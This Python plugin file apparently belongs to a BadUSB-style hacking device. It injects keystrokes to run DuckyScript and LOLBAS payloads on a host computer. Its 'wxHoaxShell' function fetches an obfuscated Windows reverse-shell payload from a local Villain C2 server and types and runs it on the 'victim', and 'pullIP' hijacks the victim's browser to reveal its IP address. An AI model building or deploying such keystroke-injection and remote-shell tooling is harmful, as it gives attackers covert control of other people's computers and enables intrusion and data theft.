from PIL import ImageFont
from time import sleep
from core.badusb.badusb import BadUSB, DuckyScriptInterpreter
from core.SH1106.screen import menu, fullClear, usbRunPercentage, waitForKey
import os

# reverse shell stuff
import socket
from core.webserver.https import *
from random import randint
from threading import Thread
import core.villain.villan_core as vil
import json
from base64 import b64decode
from requests import get, post

class vars:

    config = { 
        # you can have this in an external file, aslong as main file gets it in dictionary format
        # this is for your command help n stuff
        "payloads": "run payloads in ./plugins/payloads folder",
        #"pTest": "asdijaweu9ihf78ewrgf79",
        "pypayloads": {
            "pullIP": "get the local ip of a computer by starting an HTTP server, and making the client connect to it through browser",
            "wxHoaxShell": "to use: 1. run modified villain in an ssh session\n2.run this on victim\n3. profit",
            "lolbas": "run lolbas scripts",
        },

        "icons": {
            "pypayloads": "./core/icons/usbfolder.bmp",
            "lolbas": "./core/icons/usbfolder.bmp",
            "payloads": "./core/icons/usbfolder.bmp",
            "pullIP": "./core/icons/shell_laptop.bmp",
            "wxHoaxShell": "./core/icons/usbskull.bmp"
        }
    }

    payloadList = {}

    font = ImageFont.truetype('core/fonts/roboto.ttf', 11)

def payloads(args:list):
    # args: [draw, disp, image]

    draw, disp, image, GPIO= args[0], args[1], args[2], args[3]

    payloads = os.listdir("./plugins/payloads/")
    for file in payloads:
        with open("./plugins/payloads/{}".format(file), "r") as f:
            vars.payloadList[file] = f.read().strip().split("\n")
        
    

    vars.payloadList["back"] = '0'

    sleep(0.5)

    a = menu(draw, disp, image, list(vars.payloadList), GPIO, menuType=json.loads(open("config.json", "r").read())["screenType"])

    if a == "back":
        return

    if a == None:
        return

    usb = BadUSB()

    handler = usbRunPercentage(draw,disp,image) # init handler
    Thread(target=handler.start,daemon=True).start() # start handler

    handler.setPercentage(0)

    dsi = DuckyScriptInterpreter(usb)

    for ln in vars.payloadList[a]:
        if len(ln) == 0: continue
        if ln[0] == "#": continue

        currIndex = vars.payloadList[a].index(ln)

        # this is painful
        handler.setPercentage(
            round(100 - float(
                str( # turn decimal percentage into a string
                    "{:.0%}".format(
                        currIndex/len(
                            vars.payloadList[a] # make decimal percentage
                        )
                    )
                ).replace("%", "") # remove percentage sign
            ) # turn string back into float
            ) # round it up
        ) # set percentage

        line = ln.split(" ")
        base = line[0]
        line.pop(0)

        # sys vars
        if "![$" in line: # im going to blow up and die
            a = line
            a.split("![$")[-1]

        if base in dsi.key:
            dsi.key[base](line)

        if base == "PRINT": # print to display
            handler.addText(' '.join(line))

    handler.exit()

    waitForKey(GPIO)

def wxHoaxShell(args:list):
    draw, disp, image, GPIO= args[0], args[1], args[2], args[3]

    handler = usbRunPercentage(draw,disp,image) # init handler
    Thread(target=handler.start,daemon=True).start() # start handler
    usb = BadUSB() # init usb handler

    #payload = vil.payloadGen("windows", "wlan0", scramble=0)

    payloadSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    payloadSock.settimeout(1)
    try:
        payloadSock.connect(("127.0.0.1", 64901))
    except socket.gaierror:
        handler.addText("modified villain isnt running, run it in ssh'd shell; sudo python3 ./core/villain/villain.py")
        return

    payloadSock.sendall(json.dumps({
        "os": "windows",
        "lhost": "wlan0",
        "scramble": "2" #scramble twice
    }))
    r = payloadSock.recv(2048 * 4).decode("utf-8")
    payload = b64decode(r.encode("ascii")).decode("ascii")

    handler.setPercentage(0)

    #print(payload)
    handler.addText("executing payload")

    usb.write(payload, jitter=False, keyDelay=0, pressDelay=0) # curl our server for tcp shell

    usb.press("ENTER") # run

    sleep(0.5) # wait for cmd to finish

    usb.write("exit") # exit right after, should run in background
    usb.press("ENTER")

    handler.setPercentage(100)

    handler.addText("finished")

    waitForKey(GPIO)

    handler.exit()

    return

def lolbas(args:list):
    draw, disp, image, GPIO= args[0], args[1], args[2], args[3]

    directory = "./core/LOLBAS/"

    while True:
        # theres definitely a better way of doin this
        ####

        folder = menu(draw, disp, image, [x if os.path.isdir(x) else "" for x in os.listdir("./core/LOLBAS")], GPIO)

        if folder == None: return

        directory += folder

        ###

        script = menu(draw, disp, image, [x.replace(".txt", "") for x in os.listdir(directory)], GPIO)

        if script == None: continue

        directory += script

        break

        ###

    script = open(directory, "r").read().split("\n")

    usb = BadUSB()

    handler = usbRunPercentage(draw,disp,image) # init handler
    Thread(target=handler.start,daemon=True).start() # start handler

    handler.setPercentage(0)

    dsi = DuckyScriptInterpreter(usb)

    try:
        for ln in script:
            if len(ln) == 0: continue
            if ln[0] == "#": continue

            currIndex = script.index(ln)

            # this is painful
            handler.setPercentage(
                round(100 - float(
                    str( # turn decimal percentage into a string
                        "{:.0%}".format(
                            currIndex/len(
                                script # make decimal percentage
                            )
                        )
                    ).replace("%", "") # remove percentage sign
                ) # turn string back into float
                ) # round it up
            ) # set percentage

            line = ln.split(" ")
            base = line[0]
            line.pop(0)

            if base in dsi.key:
                dsi.key[base](line)

            if base == "PRINT": # print to display
                handler.addText(' '.join(line))
    except:
        pass

    handler.exit()

    waitForKey(GPIO)




def pullIP(args:list):
    draw, disp, image, GPIO= args[0], args[1], args[2], args[3]

    port = randint(2500,30000)

    handler = usbRunPercentage(draw,disp,image)
    Thread(target=handler.start,daemon=True).start()
    handler.clearText()

    handler.addText("starting fake tcp-http")

    #httpHandler = HTTPServer(port=port) # init the http server
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); sock.connect(("1.1.1.1", 80)) # make socket and connect to 1.1.1.1 to get local ip
    local = sock.getsockname()[0] # pull local ip from sockname
    sock.close() # close the socket

    #httpHandler.forever() # start it
    #Thread(target=httpHandler.forever, daemon=True).start() # start it

    fakeHTTP = FakeHTTPServer(bindto=(local, port))

    handler.addText("started fake tcp-http")
    handler.addText("@{}:{}".format(local,port))
    #handler.addText("make sure chrome is open and is focused on the search (1s)")

    try:
        usb = BadUSB()
    except Exception as e:
        handler.addText("couldn't open usb")
        handler.exit()
        fakeHTTP.tcp.close()
        print(e)
        return

    sleep(1)

    try:
        usb.ctrl("t") # new tab auto focuses
        usb.write("http://{}:{}/".format(local,port)) # http url
        sleep(0.25) # lil wait
        usb.press("ENTER") # enter
    except:
        handler.addText("couldn't type")
        handler.exit()
        fakeHTTP.tcp.close()
        return

    handler.addText("waiting... (5s timeout)")
    sleep(0.5) # lil wait

    try:
        client = fakeHTTP.waitFor()[1][1]
        handler.text = "I:{}\nP:{}".format(client[0], client[1]) # best formatting ever
    except Exception as e:
        print(e)
        handler.addText(str(e))

    usb.ctrl("w") # close tab
    sleep(0.25) # wait for host machine to process
    usb.ctrl("w") # twice

    usb.close()
    fakeHTTP.tcp.close()

    waitForKey(GPIO)
    sleep(0.125) # button rebound
    handler.text = "1:{0}\n2:{1}\n3:{2}\n4:{3}".format(*client[0].split(".")) # best formatting ever 2
    waitForKey(GPIO)

    handler.exit()

def functions():
    """
    put your executable functions here and your configuration
    """
    return vars.config